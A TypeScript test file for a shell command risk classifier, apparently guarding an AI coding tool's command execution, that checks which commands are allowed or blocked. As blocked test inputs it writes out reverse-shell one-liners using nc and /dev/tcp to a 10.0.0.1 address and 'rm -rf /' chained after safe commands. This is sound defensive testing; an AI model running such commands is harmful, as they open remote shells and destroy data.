// Command Risk Classifier — Classification Tests
// Run with: npx tsx lib/tools/__tests__/command-risk.test.ts

import { parseCommand, classifyCommand, previewCommand } from "../command-risk";
import type { CommandRiskLevel } from "@ethen/contracts/tools/types";

let passed = 0;
let failed = 0;

function assert(condition: boolean, label: string): void {
  if (condition) { passed += 1; return; }
  failed += 1; console.error(`  FAIL: ${label}`);
}

function assertEqual<T>(actual: T, expected: T, label: string): void {
  if (actual === expected) { passed += 1; return; }
  failed += 1; console.error(`  FAIL: ${label} — expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
}

// ── Parser tests ──────────────────────────────────────────────────────────────

console.log("\nParser — base command + args");
{
  const r = parseCommand("pnpm lint");
  assertEqual(r.baseCommand, "pnpm", "pnpm lint → base pnpm");
  assertEqual(r.args[0], "lint", "pnpm lint → arg lint");
  assert(r.isSafe, "pnpm lint → isSafe");
  assert(!r.hasEnvAssignment, "pnpm lint → no env");
}

{
  const r = parseCommand("git status");
  assertEqual(r.baseCommand, "git", "git status → base git");
  assertEqual(r.args[0], "status", "git status → arg status");
}

{
  const r = parseCommand("pnpm test");
  assertEqual(r.baseCommand, "pnpm", "pnpm test → base pnpm");
  assertEqual(r.args[0], "test", "pnpm test → arg test");
}

{
  const r = parseCommand("git diff");
  assertEqual(r.baseCommand, "git", "git diff → base git");
  assertEqual(r.args[0], "diff", "git diff → arg diff");
}

// ── Operator detection ────────────────────────────────────────────────────────

console.log("Parser — shell operators");
{
  const r = parseCommand("pnpm lint && rm -rf /");
  assert(!r.isSafe, "&& operator → not safe");
  assert(r.operators.some((o) => o.kind === "and"), "&& detected");
}

{
  const r = parseCommand("pnpm lint || echo fail");
  assert(!r.isSafe, "|| operator → not safe");
  assert(r.operators.some((o) => o.kind === "or"), "|| detected");
}

{
  const r = parseCommand("pnpm lint; rm -rf /");
  assert(!r.isSafe, "; operator → not safe");
  assert(r.operators.some((o) => o.kind === "semicolon"), "; detected");
}

{
  const r = parseCommand("cat file | grep foo");
  assert(!r.isSafe, "| operator → not safe");
  assert(r.operators.some((o) => o.kind === "pipe"), "pipe detected");
}

{
  const r = parseCommand("echo $(whoami)");
  assert(!r.isSafe, "$() → not safe");
  assert(r.hasSubshell, "subshell detected via $()");
}

{
  const r = parseCommand("echo `whoami`");
  assert(!r.isSafe, "backticks → not safe");
  assert(r.hasSubshell, "subshell detected via backticks");
}

{
  const r = parseCommand("pnpm lint > out.txt");
  assert(!r.isSafe, "> redirect → not safe");
  assert(r.hasRedirect, "redirect detected");
}

{
  const r = parseCommand("pnpm lint >> out.txt");
  assert(!r.isSafe, ">> redirect → not safe");
}

// ── Classification tests ──────────────────────────────────────────────────────

function expectRisk(raw: string, expected: CommandRiskLevel): void {
  const r = parseCommand(raw);
  const risk = classifyCommand(r);
  assertEqual(risk, expected, `"${raw}" → ${expected}`);
}

console.log("Classification — validation commands");
expectRisk("pnpm lint", "validation");
expectRisk("pnpm typecheck", "validation");
expectRisk("pnpm build", "validation");
expectRisk("pnpm test", "validation");
expectRisk("git diff", "validation");
expectRisk("git status", "validation");
expectRisk("tsc", "validation");
expectRisk("eslint .", "validation");
expectRisk("npx tsc", "validation");

console.log("Classification — safe read-only");
expectRisk("ls", "safe_read_only");
expectRisk("pwd", "safe_read_only");
expectRisk("cat README.md", "safe_read_only");
expectRisk("grep foo file.txt", "safe_read_only");
expectRisk("find . -name '*.ts'", "safe_read_only");
expectRisk("echo hello", "safe_read_only");
expectRisk("date", "safe_read_only");

console.log("Classification — package install (blocked)");
expectRisk("npm install react", "package_install");
expectRisk("pnpm add react", "package_install");
expectRisk("pnpm install @types/react", "package_install");
expectRisk("yarn add react", "package_install");
expectRisk("yarn install react", "package_install");
expectRisk("pip install requests", "package_install");
expectRisk("pip3 install torch", "package_install");
expectRisk("bun add react", "package_install");
expectRisk("bun install react", "package_install");
expectRisk("npm i -g typescript", "package_install");
expectRisk("npm add react", "package_install");
expectRisk("cargo install ripgrep", "package_install");
expectRisk("apt install curl", "package_install");
expectRisk("apt-get install curl", "package_install");
expectRisk("brew install node", "package_install");
expectRisk("choco install node", "package_install");
expectRisk("snap install node", "package_install");
expectRisk("docker run nginx", "package_install");
expectRisk("docker pull nginx", "package_install");
expectRisk("go install ./...", "package_install");

console.log("Classification — git mutation (blocked)");
expectRisk("git commit -m 'test'", "git_mutation");
expectRisk("git push origin main", "git_mutation");
expectRisk("git add .", "git_mutation");
expectRisk("git checkout -b feature", "git_mutation");
expectRisk("git reset HEAD~1", "git_mutation");
expectRisk("git rebase main", "git_mutation");
expectRisk("git merge feature", "git_mutation");
expectRisk("git clean -fd", "git_mutation");

console.log("Classification — network (blocked)");
expectRisk("curl https://example.com", "network");
expectRisk("wget https://example.com", "network");
expectRisk("ssh user@host", "network");
expectRisk("scp file user@host:", "network");
expectRisk("rsync -av src/ dest/", "network");
expectRisk("nc -l 8080", "network");
expectRisk("telnet host 80", "network");
expectRisk("httpie example.com", "network");
expectRisk("git clone https://github.com/foo/bar", "network");

console.log("Classification — destructive (blocked)");
expectRisk("rm -rf node_modules", "destructive");
expectRisk("rm -r data", "destructive");
expectRisk("chmod 777 app.js", "destructive");
expectRisk("chmod -R 777 .", "destructive");
expectRisk("kill -9 12345", "destructive");
expectRisk("chown -R user:group .", "destructive");
expectRisk("shutdown -h now", "destructive");
expectRisk("reboot", "destructive");

console.log("Classification — secrets/cloud (blocked)");
expectRisk("aws s3 ls", "secrets_or_cloud");
expectRisk("gcloud compute instances list", "secrets_or_cloud");
expectRisk("kubectl get pods", "secrets_or_cloud");
expectRisk("terraform apply", "secrets_or_cloud");
expectRisk("terraform destroy", "secrets_or_cloud");
expectRisk("vercel deploy", "secrets_or_cloud");
expectRisk("heroku logs", "secrets_or_cloud");
expectRisk("gh secret list", "secrets_or_cloud");

console.log("Classification — unknown (blocked)");
expectRisk("rm file.txt", "unknown");
expectRisk("mv file.txt dir/", "unknown");
expectRisk("mkdir newdir", "unknown");
expectRisk("touch newfile", "unknown");

console.log("Classification — lifecycle scripts (blocked)");
expectRisk("pnpm run postinstall", "package_install");
expectRisk("npm run postinstall", "package_install");
expectRisk("yarn run postinstall", "package_install");
expectRisk("pnpm run prepare", "package_install");
expectRisk("npm run prepare", "package_install");
expectRisk("pnpm run preinstall", "package_install");
expectRisk("npm run prepublish", "package_install");

console.log("Classification — npx arbitrary (blocked as unknown)");
expectRisk("npx some-unknown-tool", "unknown");
expectRisk("npx create-react-app", "unknown");
expectRisk("npx", "unknown");
// Whitelisted npx subcommands still classified as validation
expectRisk("npx tsc --noEmit", "validation");
expectRisk("npx vitest", "validation");
expectRisk("npx eslint .", "validation");

console.log("Classification — exfiltration / command execution (blocked as destructive)");
expectRisk("nc -e /bin/sh 10.0.0.1 4444", "destructive");
expectRisk("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "destructive");
expectRisk("python -c 'import socket'", "destructive");
expectRisk("perl -e 'exec'", "destructive");
expectRisk("ruby -e 'system'", "destructive");
expectRisk("php -r 'system'", "destructive");

// ── Full policy tests ─────────────────────────────────────────────────────────

console.log("Full policy — allowed commands pass");
const policy1 = previewCommand("pnpm lint");
assert(policy1.allowed, "pnpm lint → allowed");
assert(policy1.approvalRequired, "pnpm lint → approval required");

const policy2 = previewCommand("pnpm build");
assert(policy2.allowed, "pnpm build → allowed");

const policy3 = previewCommand("git status");
assert(policy3.allowed, "git status → allowed");

console.log("Full policy — blocked commands");
const pBlock = previewCommand("rm -rf node_modules");
assert(!pBlock.allowed, "rm -rf → blocked");
assert(!pBlock.approvalRequired, "rm -rf → no approval (blocked)");

const pGit = previewCommand("git push");
assert(!pGit.allowed, "git push → blocked");

const pInstall = previewCommand("npm install");
assert(!pInstall.allowed, "npm install → blocked");

const pCurl = previewCommand("curl example.com");
assert(!pCurl.allowed, "curl → blocked");

const pAws = previewCommand("aws s3 ls");
assert(!pAws.allowed, "aws s3 ls → blocked");

console.log("Full policy — shell operators blocked even with allowlisted base");
const pAnd = previewCommand("pnpm lint && echo hi");
assert(!pAnd.allowed, "pnpm lint && → blocked (operators)");

const pSemi = previewCommand("pnpm lint; rm -rf /");
assert(!pSemi.allowed, "pnpm lint; → blocked (semicolon)");

const pPipe = previewCommand("pnpm lint | grep error");
assert(!pPipe.allowed, "pnpm lint | → blocked (pipe)");

const pSub = previewCommand("echo $(whoami)");
assert(!pSub.allowed, "echo $(whoami) → blocked (subshell)");

const pRedirect = previewCommand("pnpm lint > out.txt");
assert(!pRedirect.allowed, "pnpm lint > → blocked (redirect)");

console.log("Full policy — unknown commands blocked");
const pUnknown = previewCommand("touch newfile");
assert(!pUnknown.allowed, "touch → blocked (unknown)");
assertEqual(pUnknown.riskLevel, "unknown", "touch → risk unknown");

// ── Summary ────────────────────────────────────────────────────────────────────

console.log(`\n${passed} passed, ${failed} failed, ${passed + failed} total`);
if (failed > 0) process.exit(1);
